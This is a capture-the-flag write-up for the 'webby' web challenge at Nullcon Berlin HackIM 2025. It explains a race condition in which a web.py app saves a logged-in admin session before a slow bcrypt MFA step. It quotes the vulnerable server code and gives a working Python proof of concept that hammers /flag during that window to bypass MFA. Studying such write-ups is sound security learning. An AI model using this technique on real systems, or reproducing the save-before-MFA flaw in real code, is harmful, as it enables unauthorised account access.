---
title: "webby - Nullcon Berlin HackIM 2025 CTF"
category: "web"
subcategory: "race"
type: "writeup"
tags: ["python", "race-condition", "web", "webby", "race", "nullcon-berlin-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "Webby is a tiny web.py app with an MFA gate."
source:
  name: "CTFtime writeup #40426"
  url: "https://ctftime.org/writeup/40426"
original_source: "https://blog.hitc.at/posts/ctf/nullcon-berlin-hackim-2025-ctf/webby/"
ctf:
  name: "Nullcon Berlin HackIM 2025 CTF"
  year: 2025
  challenge: "webby"
---

## Metadata

- **CTF:** Nullcon Berlin HackIM 2025 CTF
- **Task:** webby
- **Author team:** fish3r
- **CTFtime tags:** python, race-condition, web
- **CTFtime:** <https://ctftime.org/writeup/40426>
- **Original writeup:** <https://blog.hitc.at/posts/ctf/nullcon-berlin-hackim-2025-ctf/webby/>

---
## Introduction

**Webby** is a tiny [web.py](http://web.py) app with an MFA gate. The intended flow is: valid credentials → MFA page → enter token → see the flag. The implementation introduces a **race condition**: the server briefly marks you as **logged in** *before* computing the costly MFA token and disabling the session, so a concurrent request can slip through to `/flag` and bypass MFA entirely.

### Context Explanation

* **Stack:** Python `[web.py](http://web.py)`, `bcrypt`, `shelve`-backed sessions (`/tmp/session.shelf`).  
* **Auth:** static user DB, `admin/admin` requires MFA.  
* **MFA:** server stores a per-session `tokenMFA` derived with **bcrypt cost 14** and wraps it with an MD5 (heavy/slow by design).  
* **Flag gate:** `/flag` checks only `session.loggedIn` and `session.username == 'admin'`.

Key bits:

```python  
# Session + flag  
session = web.session.Session(app, web.session.ShelfStore(shelve.open("/tmp/session.shelf")))  
FLAG = open("/tmp/flag.txt").read()  
```

### Directive

Exploit the race by sending **two concurrent requests**: (1) POST `/` to login as `admin` and (2) immediate GET `/flag` with the **same session cookie** while the server is busy generating the MFA token.

\---

## Solution

### 1) Credentials and MFA requirement

```python  
def check_user_creds(user,pw):  
users = {  
# Add more users if needed  
'user1': 'user1',  
'user2': 'user2',  
'user3': 'user3',  
'user4': 'user4',  
'admin': 'admin',

}  
try:  
return users[user] == pw  
except:  
return False

def check_mfa(user):  
users = {  
'user1': False,  
'user2': False,  
'user3': False,  
'user4': False,  
'admin': True,  
}  
try:  
return users[user]  
except:  
return False  
```

### 2) Vulnerable login flow (TOCTOU)

On successful credentials, the code **sets the session to logged in** and writes it to disk, *then* starts MFA setup:

```python  
# POST '/' (login)  
def POST(self):  
f = login_Form()  
if not f.validates():  
session.kill()  
return render.index(f)  
i = web.input()  
if not check_user_creds(i.username, i.password):  
session.kill()  
raise web.seeother('/')  
else:  
session.loggedIn = True  
session.username = i.username  
session._save()

if check_mfa(session.get("username", None)):  
session.doMFA = True  
# heavy work  
session.tokenMFA = hashlib.md5(bcrypt.hashpw(str(secrets.randbits(random.randint(40,65))).encode(),bcrypt.gensalt(14))).hexdigest()  
session.loggedIn = False # <\-- flipped back *after* the heavy work  
session._save()  
raise web.seeother("/mfa")  
return render.login(session.get("username",None))  
```

Because `bcrypt.gensalt(14)` + `hashpw` is **expensive**, there is a window where:

* `session.loggedIn == True` and `session.username == 'admin'` have been saved,  
* the app is still busy generating `tokenMFA`,  
* the flip to `loggedIn = False` hasn’t been saved yet.

### 3) Flag guard (weak)

```python  
# GET '/flag'  
if not session.get("loggedIn", False) or session.get("username", None) != "admin":  
raise web.seeother('/')  
return render.flag(FLAG)  
```

No MFA state is checked here - only the session flags. Hit this endpoint during the window and you win.

### 4) PoC (concurrent requests)

Strategy: fire the **login** and hammer **/flag** in parallel until one GET lands during the bcrypt window.

```python  
import requests, threading, time

BASE_URL = "http://52.59.124.14:5010"

session = requests.Session()  
session.get(BASE_URL + "/")   
cookies = dict(session.cookies)

def login_admin():  
data = {"username": "admin", "password": "admin", "submit": ""}  
[requests.post](http://requests.post)(BASE_URL + "/", data=data, cookies=cookies)

thread = threading.Thread(target=login_admin, daemon=True)  
thread.start()  
time.sleep(0.02)

end = time.time() + 2  
while time.time() < end:  
response = requests.get(BASE_URL + "/flag", cookies=cookies)  
if response.status_code == 200 and "flag" in response.text.lower():  
print(response.text)  
break  
time.sleep(0.005)

thread.join(timeout=1)  
```

![Flag](<http://blog.hitc.at/images/nullconberlin2025/web/webby_flag.png#center>)

**Why it works:** The app performs `session._save()` with `loggedIn=True` **before** the costly bcrypt step. While bcrypt runs, the same session cookie can be used to request `/flag`. The `/flag` check passes because it only inspects `loggedIn` and `username`.
